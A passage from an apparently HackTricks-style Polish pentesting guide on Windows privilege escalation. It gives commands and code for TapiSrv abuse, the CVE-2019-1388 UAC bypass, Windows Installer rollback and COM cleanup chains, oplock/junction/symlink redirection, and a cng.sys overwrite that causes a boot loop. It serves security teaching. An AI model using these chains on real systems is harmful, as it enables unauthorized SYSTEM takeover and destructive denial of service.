Usługa Telephony (TapiSrv) w trybie serwera udostępnia `\\pipe\\tapsrv` (MS-TRP). Zdalny, uwierzytelniony klient może nadużyć asynchronicznej ścieżki zdarzeń opartej na mailslotach, aby wykorzystać `ClientAttach` do wykonania dowolnego **zapisu 4 bajtów** do dowolnego istniejącego pliku, do którego zapis ma `NETWORK SERVICE`. Następnie może uzyskać uprawnienia administratora Telephony i załadować dowolną bibliotekę DLL jako usługa. Pełny przebieg:

- Wywołaj `ClientAttach` z `pszDomainUser` ustawionym na istniejącą ścieżkę, do której można zapisywać → usługa otwiera ją przez `CreateFileW(..., OPEN_EXISTING)` i używa do asynchronicznego zapisu zdarzeń.
- Każde zdarzenie zapisuje kontrolowaną przez atakującego wartość `InitContext` z `Initialize` do tego uchwytu. Zarejestruj aplikację line za pomocą `LRegisterRequestRecipient` (`Req_Func 61`), wywołaj `TRequestMakeCall` (`Req_Func 121`), pobierz zdarzenia przez `GetAsyncEvents` (`Req_Func 0`), a następnie wyrejestruj aplikację i zamknij połączenie, aby powtarzać deterministyczne zapisy.
- Dodaj siebie do `[TapiAdministrators]` w `C:\Windows\TAPI\tsec.ini`, połącz się ponownie, a następnie wywołaj `GetUIDllName` z dowolną ścieżką do DLL, aby wykonać `TSPI_providerUIIdentify` jako `NETWORK SERVICE`.

Więcej szczegółów:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Różne

### Rozszerzenia plików, które mogą uruchamiać kod w Windows

Sprawdź stronę **[https://filesec.io/](https://filesec.io/)**

### Nadużywanie handlerów protokołów / ShellExecute za pośrednictwem rendererów Markdown

Klikalne linki Markdown przekazywane do `ShellExecuteExW` mogą uruchamiać niebezpieczne handlery URI (`file:`, `ms-appinstaller:` lub dowolny zarejestrowany schemat) i wykonywać pliki kontrolowane przez atakującego jako bieżący użytkownik. Zobacz:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitorowanie wierszy poleceń pod kątem haseł**

Po uzyskaniu shella jako użytkownik mogą być uruchamiane zaplanowane zadania lub inne procesy, które **przekazują poświadczenia w wierszu poleceń**. Poniższy skrypt przechwytuje wiersze poleceń procesów co dwie sekundy i porównuje bieżący stan z poprzednim, wyświetlając wszelkie różnice.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Wykradanie haseł z procesów

## Od użytkownika o niskich uprawnieniach do NT\AUTHORITY SYSTEM (CVE-2019-1388) / obejście UAC

Jeśli masz dostęp do interfejsu graficznego (przez konsolę lub RDP), a funkcja UAC jest włączona, w niektórych wersjach Microsoft Windows można uruchomić terminal lub dowolny inny proces jako „NT\AUTHORITY SYSTEM” z poziomu użytkownika bez uprawnień.

Umożliwia to jednoczesne eskalowanie uprawnień i obejście UAC za pomocą tej samej luki. Nie trzeba też niczego instalować, a plik binarny używany w trakcie tego procesu jest podpisany i wydany przez Microsoft.

Do systemów podatnych na ten problem należą między innymi:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Aby wykorzystać tę podatność, należy wykonać następujące kroki:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Masz wszystkie niezbędne pliki i informacje w tym repozytorium GitHub:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Od Administrator Medium do High Integrity Level / obejście UAC

Przeczytaj to, aby **dowiedzieć się o poziomach integralności**:


{{#ref}}
integrity-levels.md
{{#endref}}

Następnie **przeczytaj to, aby dowiedzieć się o UAC i jego obejściach:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Junctions w katalogach przesyłania plików kierujące do katalogu głównego serwowanego przez serwer

Aplikacja może tworzyć przewidywalny podkatalog na przesyłane pliki, zapisywać w nim nazwę pliku dostarczoną przez wywołującego, a następnie przetwarzać ten plik. Jeśli użytkownik o niskich uprawnieniach może usunąć ten podkatalog i zastąpić go junction NTFS przed zapisem po stronie serwera, zapis może podążyć za junction do katalogu udostępnianego przez serwer WWW. Umieszczony tam skrypt może zostać uruchomiony z uprawnieniami tożsamości usługi WWW, jeśli serwer wykonuje pliki tego typu. Jest to specyficzna dla aplikacji granica dowolnego zapisu; sam zapisywalny katalog przesyłania plików ani istniejący junction tego nie dowodzą.

Sprawdź dokładny sposób konstruowania ścieżki i harmonogram działania obsługi przesyłania plików, efektywne uprawnienia użytkownika do usuwania i tworzenia podkatalogu, efektywne ACL miejsca docelowego, to, czy mechanizm zapisujący podąża za punktami ponownej analizy, oraz to, czy serwer WWW wykonuje pliki w miejscu docelowym. Osobno ustal tożsamość procesu zapisującego i serwera WWW. Pasywna inwentaryzacja może wykazać ACL katalogów i metadane punktów ponownej analizy, ale nie pozwala ustalić zachowania obsługi ani przyszłej podmiany junction. Jeśli wykonanie odbywa się w kontekście konta usługi, przed rozważeniem odrębnej ścieżki wykorzystującej uprawnienia tokenu sprawdź **rzeczywisty token procesu**.

## Wyzwalane przez WNF czyszczenie uprzywilejowanego zaplanowanego zadania

Zaplanowane zadanie, które odmawia ręcznego uruchomienia, może mimo to udostępniać nieuprzywilejowany mechanizm wyzwalający. Podczas audytu uprzywilejowanego zadania wyeksportuj jego XML i sprawdź **wszystkie** wyzwalacze, a także DACL zadania, principal i akcję. W szczególności `WnfStateChangeTrigger` wskazuje stan Windows Notification Facility (WNF); jeśli ten stan z zabezpieczeniami pozwala bieżącemu użytkownikowi opublikować aktualizację, użytkownik może pośrednio uruchomić zadanie z skonfigurowaną dla niego tożsamością, mimo że ustawiono `<AllowStartOnDemand>false</AllowStartOnDemand>`.<sup>[[43]](#references)</sup>

Na przykład zadanie Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` działało jako SYSTEM, akceptowało od standardowego użytkownika aktualizacje stanu WNF `7508BCA32C079E41`, a następnie sprawdzało `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}`, nawet gdy Recall było wyłączone.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Aby przetestować osiągalność, rozwiąż `ZwUpdateWnfStateData` z `ntdll.dll`, wyślij pustą aktualizację dla ośmiobajtowej nazwy stanu i skoreluj zwrócony status z danymi o ostatnim uruchomieniu zadania lub aktywnością w Procmon. Poniższa uproszczona sonda używa sekwencji bajtów z przykładu zadania Recall; zastąp ją bajtami wyeksportowanymi dla testowanego zadania.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Przekształcenie rekurencyjnego czyszczenia w uprzywilejowane usuwanie

Przydatnym prymitywem nie jest sam trigger, lecz uprzywilejowana procedura czyszczenia, która przyjmuje katalog kontrolowany przez atakującego. Prześledź operację od wyliczenia do końcowej modyfikacji: wyszukiwanie profili/sesji, dzieci wybierane przez wildcard, `SHCreateItemFromParsingName` i `IFileOperation::DeleteItem` to mocne przesłanki, że wcześniej sprawdzona ścieżka zostanie później przetworzona rekurencyjnie. Jeśli elementy podrzędne nie są otwierane względem zaufanych uchwytów katalogów i weryfikowane przed usunięciem, atakujący może zmienić sposób rozwiązywania ścieżki między jej wyliczeniem a użyciem.<sup>[[43]](#references)</sup>

Połącz trigger WNF z opisanym poniżej [podstawieniem oplock, junction i symlink Object Manager](#from-folder-contents-delete-to-system-eop): oplock wstrzymuje proces czyszczenia po wybraniu przez niego prawidłowego elementu podrzędnego, a następnie zapisywalny katalog nadrzędny zostaje podmieniony, tak aby wznowione uprzywilejowane usuwanie rozwiązało ścieżkę przez `\RPC Control` do chronionego celu. W łańcuchu Recall doprowadziło to do usunięcia przez SYSTEM `C:\Config.Msi`, wymaganego przez opisaną technikę rollback MSI.<sup>[[31]](#references)[[43]](#references)</sup>

### Zagnieżdżone elementy podrzędne omijają płytkie poprawki dotyczące reparse point

Weryfikacja wyłącznie katalogu głównego kontrolowanego przez atakującego i jego bezpośredniego elementu podrzędnego nie zabezpiecza rekurencyjnego usuwania opartego na ścieżkach. Pozostaw te sprawdzone obiekty bez zmian, a podstawienie junction/oplock przenieś do kolejnego elementu podrzędnego; `IFileOperation::DeleteItem` ostatecznie dotrze do nieweryfikowanego elementu podrzędnego i podąży za jego nowym celem. CVE-2026-20941 powstał właśnie w wyniku tego rodzaju niekompletnej poprawki: pierwsza poprawka Recall weryfikowała `UKP` i katalog o nazwie w formacie GUID, ale pozostawiała starą operację rekurencyjnego usuwania.<sup>[[43]](#references)</sup>

Bezpieczny wzorzec polega na otwarciu **każdego elementu podrzędnego** względem już zaufanego uchwytu katalogu, pobraniu i zweryfikowaniu ostatecznej ścieżki/obiektu oraz zastosowaniu dyspozycji usunięcia do zweryfikowanego uchwytu. Nie weryfikuj prefiksu, a następnie nie wracaj do rekurencyjnego usuwania opartego na ścieżce. Podczas przeglądu poprawek sprawdzaj też struktury w rzeczywistym miejscu wywołania: w tym przypadku inspekcja w czasie działania `OBJECT_ATTRIBUTES` przy `NtCreateFile` wykazała niepusty `RootDirectory` i względną nazwę `{GUID}\\secure_file.lock`, obalając mylący wynik dekompilatora sugerujący drugi prymityw `FILE_DELETE_ON_CLOSE`.<sup>[[43]](#references)</sup>

## Od dowolnego usuwania/przenoszenia/zmiany nazwy folderu do SYSTEM EoP

Technika opisana [**w tym wpisie na blogu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), wraz z kodem exploita [**dostępnym tutaj**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Atak polega zasadniczo na wykorzystaniu funkcji rollback Windows Installer do zastąpienia prawidłowych plików złośliwymi podczas procesu odinstalowywania. W tym celu atakujący musi utworzyć **złośliwy instalator MSI**, który posłuży do przejęcia folderu `C:\Config.Msi`. Windows Installer wykorzysta go później do przechowywania plików rollback podczas odinstalowywania innych pakietów MSI; pliki rollback zostaną zmodyfikowane tak, aby zawierały złośliwy payload.

### Wstrzyknięcie ścieżki czyszczenia COM w Windows Installer (CVE-2025-27727)

Klient o niskich uprawnieniach może uzyskać dostęp do usługi SYSTEM `msiexec.exe` za pośrednictwem obiektu COM `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Inżynieria wsteczna pozwoliła zidentyfikować odpowiednie wywołania `IMsiServer`: `MsiBeginTransactionW` pod offsetem vtable `0xA0`, `SetEEUIDirectoryAndFilter` pod `0xC8` oraz `CleanupTempPackages` pod `0x50`. Nazwy i offsety ustalono metodą inżynierii wstecznej i mogą się różnić między kompilacjami.<sup>[[41]](#references)</sup>

W przypadku użytkownika niebędącego administratorem `SetEEUIDirectoryAndFilter` wykonuje impersonację wywołującego tylko podczas otwierania podanej ścieżki z uprawnieniem `DELETE` oraz flagami `FILE_FLAG_BACKUP_SEMANTICS` i `FILE_FLAG_OPEN_REPARSE_POINT`. Potwierdza to, że wywołujący może usunąć katalog, i zapobiega podążaniu za reparse point, ale **nie** wiąże sprawdzonego obiektu pliku z późniejszym czyszczeniem ani nie dowodzi, że utworzył go Windows Installer.<sup>[[41]](#references)</sup>

Po `MsiBeginTransactionW` `SetEEUIDirectoryAndFilter` dodaje ścieżkę do harmonogramu jako folder, niezależnie od argumentu filtra wywołującego. Usługa zapisuje nazwaną wartość `REG_DWORD` w kluczu `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: nazwą wartości jest ścieżka kontrolowana przez wywołującego, a dane `0x00000002` oznaczają flagę folderu. Następnie `CleanupTempPackages(NULL, FALSE)` bezpośrednio uruchamia czyszczenie. Podwyższony worker wylicza wartości rejestru i przekazuje wpisy folderów do rekurencyjnej funkcji `FDeleteFolder`, nie sprawdzając pochodzenia ścieżek. Jeśli zwykłe usuwanie się nie powiedzie, kod wywołuje również `LockdownPath`, czyści atrybuty pliku i ponawia próbę.<sup>[[41]](#references)</sup>

Minimalna sekwencja wywołań odzyskana z `msi.dll`:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Przydatnym prymitywem jest ponowne użycie ścieżki, a nie przekierowanie przez junction. Zarejestruj utworzone przez atakującego `C:\Config.Msi`, usuń je, a następnie pozwól Windows Installer ponownie utworzyć ten sam pathname z chronionymi danymi rollback. Procedura czyszczenia ufa nieaktualnej nazwie `TempPackages` i usuwa nowy katalog jako SYSTEM. To omija zamierzoną granicę ochrony zapewnianą przez `FILE_FLAG_OPEN_REPARSE_POINT` i mechanizm ograniczający zaufanie do przekierowań, ponieważ nie jest wymagany żaden reparse point.<sup>[[41]](#references)</sup>

Ten prymityw usuwania pasuje do poniższego łańcucha rollback: zachowaj osobny rekord `Installer\Folders`, usuń chroniony `C:\Config.Msi`, utwórz go ponownie z NULL DACL i zachowaj uchwyt z uprawnieniem `WRITE_DAC` uzyskanym przed zaostrzeniem DACL przez instalator. Wstępnie otwarty uchwyt może przywrócić liberalny DACL za pomocą `NtSetSecurityObject`, po czym wygenerowany plik `.rbs` można podmienić przed wznowieniem rollback.<sup>[[41]](#references)</sup>

Microsoft naprawił tę ścieżkę, uniemożliwiając `CMsiTransaction::SetEEUIDirectoryAndFilter` wywołanie `ScheduleFileOrFolderDelete`, gdy włączona jest nowa funkcja. Wywołanie COM może nadal zwrócić sukces, ale ścieżka kontrolowana przez atakującego nie zostanie już dodana do `TempPackages`. Zastosuj aktualizacje zabezpieczeń Windows z kwietnia 2025 r., zamiast uznawać pomyślny zwrot metody za test poprawki.<sup>[[41]](#references)[[42]](#references)</sup>

Podsumowana technika wygląda następująco:

1. **Etap 1 – Przygotowanie do przejęcia (pozostawienie pustego `C:\Config.Msi`)**

- Krok 1: Zainstaluj MSI
    - Utwórz plik `.msi`, który instaluje nieszkodliwy plik (np. `dummy.txt`) w zapisywalnym folderze (`TARGETDIR`).
    - Oznacz instalator jako **„UAC Compliant”**, aby **użytkownik niebędący administratorem** mógł go uruchomić.
    - Po instalacji pozostaw otwarty **uchwyt** do pliku.

- Krok 2: Rozpocznij odinstalowywanie
    - Odinstaluj ten sam plik `.msi`.
    - Proces odinstalowywania zaczyna przenosić pliki do `C:\Config.Msi` i zmieniać ich nazwy na pliki `.rbf` (kopie zapasowe rollback).
    - **Odpytuj otwarty uchwyt pliku** za pomocą `GetFinalPathNameByHandle`, aby wykryć, kiedy plik zmieni ścieżkę na `C:\Config.Msi\<random>.rbf`.

- Krok 3: Synchronizacja niestandardowa
    - Plik `.msi` zawiera **niestandardową akcję odinstalowywania (`SyncOnRbfWritten`)**, która:
        - Sygnalizuje zapisanie pliku `.rbf`.
        - Następnie **czeka** na inne zdarzenie przed kontynuowaniem odinstalowywania.

- Krok 4: Zablokuj usunięcie pliku `.rbf`
    - Po otrzymaniu sygnału **otwórz plik `.rbf`** bez `FILE_SHARE_DELETE` — **zapobiega to jego usunięciu**.
    - Następnie **odeślij sygnał**, aby odinstalowywanie mogło się zakończyć.
    - Windows Installer nie może usunąć pliku `.rbf`, a ponieważ nie może usunąć całej zawartości, **`C:\Config.Msi` nie zostaje usunięty**.

- Krok 5: Ręcznie usuń plik `.rbf`
    - Ręcznie usuń plik `.rbf`.
    - Teraz **`C:\Config.Msi` jest pusty** i gotowy do przejęcia.

> W tym momencie **wyzwól podatność na dowolne usuwanie folderu na poziomie SYSTEM**, aby usunąć `C:\Config.Msi`.

2. **Etap 2 – Podmiana skryptów rollback na złośliwe**

- Krok 6: Utwórz ponownie `C:\Config.Msi` ze słabymi ACL
    - Samodzielnie utwórz ponownie folder `C:\Config.Msi`.
    - Ustaw **słabe DACL** (np. Everyone:F) i **pozostaw otwarty uchwyt** z uprawnieniem `WRITE_DAC`.

- Krok 7: Uruchom kolejną instalację
    - Ponownie zainstaluj plik `.msi`, ustawiając:
        - `TARGETDIR`: lokalizację z prawem zapisu.
        - `ERROROUT`: zmienną, która wywołuje wymuszony błąd.
    - Ta instalacja posłuży do ponownego wywołania **rollback**, który odczytuje pliki `.rbs` i `.rbf`.

- Krok 8: Monitoruj pojawienie się pliku `.rbs`
    - Użyj `ReadDirectoryChangesW`, aby monitorować `C:\Config.Msi` do momentu pojawienia się nowego pliku `.rbs`.
    - Zapisz jego nazwę.

- Krok 9: Synchronizacja przed rollback
    - Plik `.msi` zawiera **niestandardową akcję instalacji (`SyncBeforeRollback`)**, która:
        - Sygnalizuje zdarzenie po utworzeniu pliku `.rbs`.
        - Następnie **czeka** przed kontynuowaniem.

- Krok 10: Ponownie zastosuj słabe ACL
    - Po otrzymaniu zdarzenia ` .rbs created`:
        - Windows Installer **ponownie ustawia silne ACL** dla `C:\Config.Msi`.
        - Ponieważ jednak nadal masz uchwyt z uprawnieniem `WRITE_DAC`, możesz **ponownie ustawić słabe ACL**.

> ACL są **egzekwowane tylko podczas otwierania uchwytu**, więc nadal możesz zapisywać w folderze.

- Krok 11: Umieść fałszywe pliki `.rbs` i `.rbf`
    - Zastąp plik `.rbs` **fałszywym skryptem rollback**, który instruuje Windows, aby:
        - Przywrócił plik `.rbf` (złośliwą DLL) do **uprzywilejowanej lokalizacji** (np. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Umieść fałszywy plik `.rbf` zawierający **złośliwą DLL z payloadem na poziomie SYSTEM**.

- Krok 12: Wyzwól rollback
    - Zasygnalizuj zdarzenie synchronizacji, aby instalator wznowił działanie.
    - Skonfigurowano **niestandardową akcję typu 19 (`ErrorOut`)**, która **celowo powoduje niepowodzenie instalacji** w znanym punkcie.
    - Powoduje to rozpoczęcie **rollback**.

- Krok 13: SYSTEM instaluje Twoją DLL
    - Windows Installer:
        - Odczytuje złośliwy plik `.rbs`.
        - Kopiuje Twoją DLL z pliku `.rbf` do lokalizacji docelowej.
    - W ten sposób umieszczasz **złośliwą DLL w ścieżce, z której ładuje ją SYSTEM**.

- Ostatni krok: Uruchom kod jako SYSTEM
    - Uruchom zaufany **automatycznie podnoszący uprawnienia plik binarny** (np. `osk.exe`), który ładuje przejętą DLL.
    - **Gotowe**: Twój kod jest wykonywany **jako SYSTEM**.


### Od dowolnego usuwania/przenoszenia/zmiany nazwy plików do SYSTEM EoP

Główna technika MSI rollback (opisana powyżej) zakłada, że możesz usunąć **cały folder** (np. `C:\Config.Msi`). Ale co, jeśli podatność pozwala tylko na **dowolne usuwanie plików**?

Możesz wykorzystać **wewnętrzne mechanizmy NTFS**: każdy folder ma ukryty alternatywny strumień danych o nazwie:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Ten strumień przechowuje **metadane indeksu** folderu.

Dlatego jeśli **usuniesz strumień `::$INDEX_ALLOCATION`** folderu, NTFS **usuwa cały folder** z systemu plików.

Możesz to zrobić za pomocą standardowych interfejsów API do usuwania plików, takich jak:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Mimo że wywołujesz API usuwania *pliku*, **usuwa ono sam folder**.

### Od usuwania zawartości folderu do SYSTEM EoP
Co zrobić, jeśli Twoja prymitywa nie pozwala usuwać dowolnych plików/folderów, ale **pozwala usuwać *zawartość* folderu kontrolowanego przez atakującego**?

1. Krok 1: Przygotuj folder-przynętę i plik
- Utwórz: `C:\temp\folder1`
- Wewnątrz utwórz: `C:\temp\folder1\file1.txt`

2. Krok 2: Ustaw **oplock** na `file1.txt`
- Oplock **wstrzymuje wykonanie**, gdy uprzywilejowany proces próbuje usunąć `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Krok 3: Uruchom proces SYSTEM (np. `SilentCleanup`)
- Proces ten skanuje foldery (np. `%TEMP%`) i próbuje usunąć ich zawartość.
- Gdy dotrze do `file1.txt`, **oplock zostaje aktywowany** i przekazuje kontrolę do Twojego callbacka.

4. Krok 4: W callbacku oplocka — przekieruj usuwanie

- Opcja A: Przenieś `file1.txt` w inne miejsce
    - Spowoduje to opróżnienie `folder1` bez przerwania oplocka.
    - Nie usuwaj bezpośrednio `file1.txt` — oplock zostałby przedwcześnie zwolniony.

- Opcja B: Zamień `folder1` w **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Opcja C: Utwórz **symlink** w `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Ten atak wymierzony jest w wewnętrzny strumień NTFS przechowujący metadane folderu — jego usunięcie usuwa folder.

5. Step 5: Release the oplock
- Proces SYSTEM kontynuuje działanie i próbuje usunąć `file1.txt`.
- Jednak teraz, z powodu junction + symlink, w rzeczywistości usuwa:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Wynik**: `C:\Config.Msi` zostało usunięte przez SYSTEM.

### Od utworzenia dowolnego folderu do trwałego DoS

Wykorzystaj prymityw umożliwiający **utworzenie dowolnego folderu jako SYSTEM/admin** — nawet jeśli **nie możesz zapisywać plików** ani **ustawiać słabych uprawnień**.

Utwórz **folder** (nie plik) o nazwie **krytycznego sterownika Windows**, np.:
```
C:\Windows\System32\cng.sys
```

- Ta ścieżka zwykle odpowiada sterownikowi działającemu w trybie jądra `cng.sys`.
- Jeśli **utworzysz ją wcześniej jako folder**, system Windows nie załaduje właściwego sterownika podczas uruchamiania.
- Następnie system Windows próbuje załadować `cng.sys` podczas uruchamiania.
- Widzi folder, **nie może odnaleźć właściwego sterownika** i **ulega awarii lub zatrzymuje uruchamianie**.
- **Nie ma mechanizmu awaryjnego ani możliwości odzyskania systemu** bez zewnętrznej interwencji (np. naprawy rozruchu lub dostępu do dysku).

### Od uprzywilejowanych ścieżek logów/kopii zapasowych + symlinków OM do dowolnego nadpisania pliku / DoS podczas uruchamiania

Gdy **uprzywilejowana usługa** zapisuje logi/eksporty w ścieżce odczytanej z **zapisywalnej konfiguracji**, przekieruj tę ścieżkę za pomocą **symlinków Object Manager + punktów montowania NTFS**, aby zmienić uprzywilejowany zapis w dowolne nadpisanie pliku (nawet **bez** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Wymagania**
- Konfiguracja przechowująca ścieżkę docelową jest zapisywalna przez atakującego (np. `%ProgramData%\...\.ini`).
- Możliwość utworzenia punktu montowania do `\RPC Control` i symlinka pliku OM (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Uprzywilejowana operacja zapisująca w tej ścieżce (log, eksport, raport).

**Przykładowy łańcuch**
1. Odczytaj konfigurację, aby ustalić uprzywilejowane miejsce docelowe logu, np. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` w `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Przekieruj ścieżkę bez uprawnień administratora:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Poczekaj, aż uprzywilejowany komponent zapisze log (np. administrator wyśle „testowy SMS”). Zapis trafi teraz do `C:\Windows\System32\cng.sys`.
4. Sprawdź nadpisany plik docelowy (za pomocą parsera hex/PE), aby potwierdzić uszkodzenie; ponowne uruchomienie systemu zmusza Windows do załadowania zmodyfikowanego sterownika → **DoS w pętli rozruchowej**. Tę metodę można też zastosować do dowolnego chronionego pliku, który uprzywilejowana usługa otworzy do zapisu.

> `cng.sys` jest zwykle ładowany z `C:\Windows\System32\drivers\cng.sys`, ale jeśli kopia znajduje się w `C:\Windows\System32\cng.sys`, system może spróbować załadować ją jako pierwszą, co czyni ten plik niezawodnym celem DoS dla uszkodzonych danych.



## **Od wysokiej integralności do SYSTEM**

### **Nowa usługa**

Jeśli działasz już w procesie o wysokim poziomie integralności, **ścieżka do SYSTEM** może być prosta: wystarczy **utworzyć i uruchomić nową usługę**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Podczas tworzenia pliku binarnego usługi upewnij się, że jest to prawidłowa usługa albo że plik binarny wykonuje wymagane działania wystarczająco szybko, ponieważ po 20 sekundach zostanie zabity, jeśli nie jest prawidłową usługą.

### AlwaysInstallElevated

Z procesu o wysokim poziomie integralności możesz spróbować **włączyć wpisy rejestru AlwaysInstallElevated** i **zainstalować** reverse shell za pomocą wrappera _**.msi**_.\
[Więcej informacji o powiązanych kluczach rejestru i instalowaniu pakietu _.msi_ znajdziesz tutaj.](#alwaysinstallelevated)

### Wysoki poziom integralności + uprawnienie SeImpersonate do SYSTEM

**Kod znajdziesz** [**tutaj**](seimpersonate-from-high-to-system.md)**.**

### Od SeDebug + SeImpersonate do uprawnień Full Token

Jeśli masz te uprawnienia tokenu (prawdopodobnie znajdziesz je w procesie o wysokim poziomie integralności), będziesz mieć możliwość **otwarcia niemal dowolnego procesu** (z wyjątkiem procesów chronionych) za pomocą uprawnienia SeDebug, **skopiowania tokenu** procesu i utworzenia **dowolnego procesu z tym tokenem**.\
Ta technika zwykle polega na **wybraniu dowolnego procesu działającego jako SYSTEM ze wszystkimi uprawnieniami tokenu** (_tak, możesz znaleźć procesy SYSTEM bez wszystkich uprawnień tokenu_).\
**Przykład kodu realizującego tę technikę znajdziesz** [**tutaj**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Tej techniki używa meterpreter do eskalacji uprawnień w `getsystem`. Polega ona na **utworzeniu pipe'a, a następnie utworzeniu lub nadużyciu usługi, aby zapisywała do tego pipe'a**. Następnie **serwer**, który utworzył pipe'a przy użyciu uprawnienia **`SeImpersonate`**, będzie mógł **podszyć się pod token** klienta pipe'a (usługi), uzyskując uprawnienia SYSTEM.\
Jeśli chcesz [**dowiedzieć się więcej o name pipes, przeczytaj to**](#named-pipe-client-impersonation).\
Przykład [**przejścia od wysokiego poziomu integralności do SYSTEM przy użyciu name pipes znajdziesz tutaj**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Jeśli uda ci się **przejąć kontrolę nad dll**, która jest **ładowana** przez **proces** działający jako **SYSTEM**, będziesz mieć możliwość wykonania dowolnego kodu z tymi uprawnieniami. Dlatego Dll Hijacking jest również przydatny w tego rodzaju eskalacji uprawnień. Co więcej, jest **znacznie łatwiejszy do przeprowadzenia z procesu o wysokim poziomie integralności**, ponieważ będzie on mieć **uprawnienia do zapisu** w folderach używanych do ładowania dll.\
**Więcej o Dll hijacking dowiesz się** [**tutaj**](dll-hijacking/index.html)**.**

### **Od Administratora lub Network Service do SYSTEM**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Od LOCAL SERVICE lub NETWORK SERVICE do pełnych uprawnień

**Przeczytaj:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Dodatkowa pomoc

[Statyczne pliki binarne impacket](https://github.com/ropnop/impacket_static_binaries)

## Przydatne narzędzia

**Najlepsze narzędzie do wyszukiwania wektorów lokalnej eskalacji uprawnień w Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
